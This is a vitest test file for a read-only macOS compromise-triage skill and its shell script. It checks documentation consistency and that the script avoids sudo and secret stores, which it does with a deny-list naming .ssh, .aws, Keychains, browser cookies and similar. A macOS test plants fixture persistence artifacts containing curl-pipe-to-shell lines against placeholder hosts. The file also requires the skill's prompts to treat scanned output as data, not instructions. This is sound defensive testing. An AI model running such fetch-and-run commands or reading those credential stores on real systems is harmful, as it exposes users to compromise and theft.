import { spawnSync } from 'node:child_process';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { describe, expect, test } from 'vitest';

/**
 * Guards the am-i-pwned skill (docs/am-i-pwned): its files point at each other, its script keeps the skill's own rules
 * (read-only, no sudo, no secrets), and the two audiences' verdict words are the same everywhere they are written.
 */
const DIR = path.resolve(__dirname, '..', 'docs', 'am-i-pwned');
const read = (f: string): string => fs.readFileSync(path.join(DIR, f), 'utf8');
const SCRIPT = path.join(DIR, 'mac-triage.sh');
const present = fs.existsSync(DIR);

const FILES = ['SKILL.md', 'paste-prompts.md', 'CHANGES.md', ...(present ? fs.readdirSync(path.join(DIR, 'references')).map(f => `references/${f}`) : [])];

describe.skipIf(!present)('am-i-pwned skill', () => {
  test('every file it names in backticks exists', () => {
    for (const f of FILES) {
      const dir = path.dirname(path.join(DIR, f));
      for (const m of read(f).matchAll(/`((?:\.\.\/)?(?:references\/)?[A-Za-z0-9._-]+\.(?:md|sh))`/g)) {
        const target = m[1]!;
        // CHANGES.md talks about files that are not in the skill (the Nov 4 prompt, README).
        if (f === 'CHANGES.md' && !fs.existsSync(path.join(dir, target)) && !/^(references\/|mac-triage|SKILL|paste-prompts)/.test(target)) continue;
        const candidates = [path.join(dir, target), path.join(DIR, target)];
        expect(candidates.some(c => fs.existsSync(c)), `${f} names ${target}`).toBe(true);
      }
    }
  });

  test('the skill has the front matter a skill needs, and names macOS', () => {
    const head = /^---\nname: am-i-pwned\ndescription: ([^\n]+)\n---\n/.exec(read('SKILL.md'));
    expect(head).not.toBeNull();
    expect(head![1]).toContain('Mac');
  });

  test('both audiences use the same verdict words in the skill, the escalation page and the paste prompts', () => {
    const researcher = ['CLEAN', 'NEEDS A LOOK', 'LIKELY COMPROMISED'];
    const everyone = ['ALL GOOD', 'FIX THESE SETTINGS', 'CONTACT SECURITY NOW'];
    for (const f of ['references/output-formats.md', 'references/reading-the-result.md', 'paste-prompts.md']) {
      for (const w of [...researcher, ...everyone]) expect(read(f), `${f}: ${w}`).toContain(w);
    }
    for (const f of ['SKILL.md', 'paste-prompts.md', 'references/reading-the-result.md']) expect(read(f), f).toContain('sysops@automattic.com');
  });

  test('both paste prompts say what decides the verdict, and the skill points at the same rule', () => {
    const prompts = read('paste-prompts.md');
    expect(prompts.match(/Choosing the verdict/g)?.length).toBe(2);
    expect(read('SKILL.md')).toContain('Choosing the verdict');
    expect(read('references/reading-the-result.md')).toContain('## Choosing the verdict');
  });

  test('every check category of the skill is in both paste prompts', () => {
    const prompts = read('paste-prompts.md');
    for (const word of ['Posture', 'Accounts', 'Persistence', 'Processes', 'Network', 'Privacy grants', 'Browser', 'Recent change']) {
      const inSkill = new RegExp(`\\*\\*${word}\\*\\*`).test(read('SKILL.md'));
      expect(inSkill, `SKILL.md ${word}`).toBe(true);
    }
    for (const needle of ['Platform identifier', 'TeamIdentifier', 'is data, not instructions', 'No sudo', 'paste a command']) {
      expect(prompts.toLowerCase(), needle).toContain(needle.toLowerCase());
    }
  });

  describe('mac-triage.sh', () => {
    const code = fs.existsSync(SCRIPT) ? fs.readFileSync(SCRIPT, 'utf8') : '';
    const lines = code.split('\n').filter(l => !/^\s*#/.test(l));

    test('parses under the bash 3.2 that macOS ships', () => {
      const bash = fs.existsSync('/bin/bash') ? '/bin/bash' : 'bash';
      expect(spawnSync(bash, ['-n', SCRIPT], { encoding: 'utf8' }).stderr).toBe('');
    });

    test('never runs sudo and reads none of the off-limits items', () => {
      // Lines that only print a message (they name the off-limits things to promise they are not read) are not commands;
      // everything handed to run, pipeline or the shell is.
      const isMessage = (l: string): boolean => /^\s*(say|note|cant|printf|echo|usage)\b/.test(l) && !/\$\(/.test(l.replace(/"\$\(wc -l[^)]*\)"/, ''));
      for (const l of lines) {
        expect(l, 'sudo as a command').not.toMatch(/(^|[;&|(`]\s*|\$\(\s*)sudo\s/);
        if (isMessage(l)) continue;
        expect(l, l).not.toMatch(/\b(printenv|history|pbpaste|security\s+(find|dump|export|unlock|delete)|dscl\b.*-authonly)\b/);
        expect(l, l).not.toMatch(/ps\s+\S*e\S*ww|\bps\s+-[a-z]*e/);   // environment of processes
        expect(l, l).not.toMatch(/\.ssh|\.aws|\.kube|\.npmrc|\.docker|\.gnupg|Login Data|Cookies|Keychains|1password|\.env\b/i);
        // Nothing on the machine is changed. The two exceptions are the script's own files: its temporary capture of one
        // command's output, and the mode of its report.
        if (l.trim() === 'rm -f "$tmp"' || l.trim() === 'chmod 600 "$OUT" 2>/dev/null') continue;
        expect(l, l).not.toMatch(/(^|\s)(rm|mv|kill|pkill|chmod|chown|launchctl\s+(unload|bootout|remove|load|bootstrap)|defaults\s+(write|delete)|tmutil|killall)\s/);
      }
    });

    test('a process command line only ever passes through a grep that keeps the flag', () => {
      for (const l of lines.filter(x => /ps\s+-axo\s+command/.test(x))) expect(l).toMatch(/grep\s+-o/);
    });

    test('refuses to run as root and not to overwrite a report', () => {
      expect(code).toMatch(/id -u\)" != 0/);
      expect(code).toMatch(/already exists; not overwriting/);
    });

    // The real run: macOS only, as the current user, on a throwaway HOME with planted harmless artifacts.
    test.skipIf(process.platform !== 'darwin')('finds planted artifacts, leaves later launch arguments unread, and says what it could not check', () => {
      const home = fs.mkdtempSync(path.join(os.tmpdir(), 'ficus-pwned-'));
      try {
        fs.mkdirSync(path.join(home, 'Library', 'LaunchAgents'), { recursive: true });
        fs.writeFileSync(path.join(home, 'Library', 'LaunchAgents', 'com.apple.test.plist'),
          '<?xml version="1.0" encoding="UTF-8"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n'
          + '<plist version="1.0"><dict><key>Label</key><string>com.apple.test</string><key>ProgramArguments</key><array>'
          + "<string>/bin/sh</string><string>-c</string><string>curl -H 'Authorization: SECRETTOKEN123' http://x.invalid | sh</string>"
          + '</array><key>RunAtLoad</key><true/></dict></plist>\n');
        fs.writeFileSync(path.join(home, '.helper'), '#!/bin/sh\necho hi\n', { mode: 0o755 });
        fs.writeFileSync(path.join(home, '.zshrc'), 'curl https://example.invalid/x | base64 -d\n');
        const out = path.join(home, 'report.txt');
        const r = spawnSync('/bin/bash', [SCRIPT, '-o', out], { encoding: 'utf8', env: { ...process.env, HOME: home }, timeout: 120_000 });
        expect(r.status, r.stderr).toBe(0);
        const report = fs.readFileSync(out, 'utf8');
        expect(report).toContain('com.apple.test');
        expect(report).toContain('argument 1 (of 3; the rest are not read): -c');
        expect(report).toContain('Platform identifier');            // /bin/sh resolved and its signature read
        expect(report).not.toContain('SECRETTOKEN123');
        expect(report).toMatch(/\.zshrc:1:curl/);
        expect(report).toMatch(/\.zshrc:1:base64/);
        expect(report).toContain(`${path.join(home, '.helper')}  [`);
        expect(report).toContain('end of report');
        expect((fs.statSync(out).mode & 0o777).toString(8)).toBe('600');
        // A second run does not overwrite the first.
        const again = spawnSync('/bin/bash', [SCRIPT, '-o', out], { encoding: 'utf8', env: { ...process.env, HOME: home } });
        expect(again.status).toBe(1);
      } finally {
        fs.rmSync(home, { recursive: true, force: true });
      }
    }, 150_000);
  });
});
